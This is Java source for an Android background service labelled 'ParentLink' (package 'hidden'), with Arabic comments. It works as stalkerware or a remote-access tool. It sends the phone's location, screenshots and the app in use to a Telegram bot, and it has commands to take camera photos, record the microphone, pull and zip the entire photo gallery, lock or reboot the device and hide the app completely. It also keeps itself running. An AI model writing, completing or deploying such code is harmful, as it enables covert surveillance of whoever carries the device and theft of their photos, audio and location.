package com.parentlink.hidden;

import android.app.*;
import android.content.*;
import android.location.Location;
import android.os.*;
import android.provider.Settings;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.*;
import okhttp3.*;
import java.io.*;
import java.util.concurrent.*;
import java.util.List;

public class ParentService extends Service {
    private String botToken;
    private String chatId;
    private ScheduledExecutorService scheduler;
    private FusedLocationProviderClient locationClient;
    private LocationCallback locationCallback;
    private PowerManager.WakeLock wakeLock;
    private Context context;
    private CameraHelper cameraHelper;
    private BackgroundKeeper backgroundKeeper;
    private DeviceControlHelper deviceControlHelper;
    private FileExplorerHelper fileExplorerHelper;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        
        // تهيئة المساعدين
        cameraHelper = new CameraHelper(this);
        backgroundKeeper = new BackgroundKeeper(this);
        deviceControlHelper = new DeviceControlHelper(this);
        fileExplorerHelper = new FileExplorerHelper(this);
        
        // تحميل التوكن
        loadToken();
        
        // تفعيل وضع عدم التوقف
        backgroundKeeper.startUnyieldableService();
        
        // بدء الخدمة foreground
        startForeground(1, createNotification());
        
        // تهيئة الموقع
        locationClient = LocationServices.getFusedLocationProviderClient(this);
        
        // جدولة المهام
        scheduler = Executors.newScheduledThreadPool(10);
        startLocationUpdates();
        startScreenshotTimer();
        startAppMonitorTimer();
        startBotCommandListener();
    }

    private void loadToken() {
        File tokenFile = new File(getFilesDir(), "token.txt");
        try (BufferedReader br = new BufferedReader(new FileReader(tokenFile))) {
            String line = br.readLine();
            if (line != null && line.contains(":")) {
                String[] parts = line.split(":");
                botToken = parts[0];
                chatId = parts[1];
                TelegramBotHelper.init(botToken, chatId);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private Notification createNotification() {
        NotificationChannel channel = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            channel = new NotificationChannel("parent_channel", 
                "ParentLink Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, "parent_channel")
            .setContentTitle("ParentLink")
            .setContentText("الخدمة تعمل في الخلفية")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    private void sendTelegramMessage(String text) {
        TelegramBotHelper.sendMessageToBot(text);
    }

    private void sendTelegramPhoto(String photoPath, String caption) {
        TelegramBotHelper.sendSingleImage(photoPath, caption);
    }

    private void startLocationUpdates() {
        LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setInterval(60000);
        locationRequest.setFastestInterval(30000);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc != null) {
                    String text = "📍 الموقع: " + loc.getLatitude() + "," + loc.getLongitude();
                    sendTelegramMessage(text);
                }
            }
        };
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
            == PackageManager.PERMISSION_GRANTED) {
            locationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
        }
    }

    private void startScreenshotTimer() {
        scheduler.scheduleAtFixedRate(() -> {
            String path = ScreenshotHelper.captureScreen(context);
            if (path != null) {
                sendTelegramPhoto(path, "📸 لقطة شاشة تلقائية");
            }
        }, 0, 2, TimeUnit.MINUTES);
    }

    private void startAppMonitorTimer() {
        scheduler.scheduleAtFixedRate(() -> {
            String currentApp = AppMonitor.getForegroundApp(context);
            if (currentApp != null) {
                sendTelegramMessage("📱 فتح تطبيق: " + currentApp);
            }
        }, 0, 1, TimeUnit.SECONDS);
    }

    private void startBotCommandListener() {
        scheduler.scheduleAtFixedRate(() -> {
            // معالجة الأوامر - يتم استقبالها عبر webhook أو polling
        }, 0, 2, TimeUnit.SECONDS);
    }

    // ========== أوامر الكاميرا ==========
    private void handleCaptureBackCamera() {
        String imagePath = cameraHelper.captureBackCamera();
        if (imagePath != null) {
            sendTelegramPhoto(imagePath, "📸 صورة من الكاميرا الخلفية");
        } else {
            sendTelegramMessage("❌ فشل التقاط الصورة من الكاميرا الخلفية");
        }
    }

    private void handleCaptureFrontCamera() {
        String imagePath = cameraHelper.captureFrontCamera();
        if (imagePath != null) {
            sendTelegramPhoto(imagePath, "🤳 صورة من الكاميرا الأمامية");
        } else {
            sendTelegramMessage("❌ فشل التقاط الصورة من الكاميرا الأمامية");
        }
    }

    // ========== أوامر التحكم بالجهاز ==========
    private void handleShutdown() {
        if (deviceControlHelper.shutdownDevice()) {
            sendTelegramMessage("🖥️ يتم إيقاف تشغيل الجهاز...");
        } else {
            sendTelegramMessage("❌ فشل إيقاف التشغيل");
        }
    }

    private void handleReboot() {
        if (deviceControlHelper.rebootDevice()) {
            sendTelegramMessage("🔄 يتم إعادة تشغيل الجهاز...");
        } else {
            sendTelegramMessage("❌ فشل إعادة التشغيل");
        }
    }

    private void handleHideApp() {
        deviceControlHelper.hideAppCompletely();
        sendTelegramMessage("👻 تم إخفاء التطبيق بالكامل");
    }

    private void handleLockScreen() {
        deviceControlHelper.lockDevice();
        sendTelegramMessage("🔒 تم قفل الشاشة");
    }

    // ========== أوامر الملفات والصور ==========
    private void handlePullAllImages() {
        List<String> images = FileExplorerHelper.getAllImages(this);
        if (images.isEmpty()) {
            sendTelegramMessage("❌ لا توجد صور في المعرض");
            return;
        }
        sendTelegramMessage("📸 جاري سحب " + images.size() + " صورة...");
        String zipPath = FileExplorerHelper.zipImages(images, this);
        if (zipPath != null) {
            TelegramBotHelper.sendZipFile(zipPath, "📸 جميع الصور (" + images.size() + ")");
        }
    }

    private void handlePullLatestImages() {
        List<String> images = FileExplorerHelper.getLatestImages(this, 10);
        if (images.isEmpty()) {
            sendTelegramMessage("❌ لا توجد صور");
            return;
        }
        for (String imgPath : images) {
            sendTelegramPhoto(imgPath, "📸 أحدث الصور");
        }
    }

    // ========== أوامر التسجيل الصوتي ==========
    private void handleMicOn() {
        AudioRecorderHelper.startRecording(this);
        sendTelegramMessage("🎙️ بدء التسجيل الصوتي لمدة 30 ثانية");
        scheduler.schedule(() -> {
            String audioPath = AudioRecorderHelper.stopRecording();
            if (audioPath != null) {
                TelegramBotHelper.sendAudioFile(audioPath, "🎤 تسجيل صوتي");
            }
        }, 30, TimeUnit.SECONDS);
    }

    // ========== أوامر الحالة ==========
    private void handleStatus() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        int battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        sendTelegramMessage("📊 **حالة التطبيق**\n✅ يعمل\n🔋 البطارية: " + battery + "%\n📍 آخر موقع: تم الإرسال");
    }

    private void handleRestart() {
        stopSelf();
        Intent intent = new Intent(this, ParentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        sendTelegramMessage("🔄 تم إعادة تشغيل الخدمة");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (locationClient != null && locationCallback != null) {
            locationClient.removeLocationUpdates(locationCallback);
        }
        if (backgroundKeeper != null) backgroundKeeper.releaseWakeLock();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}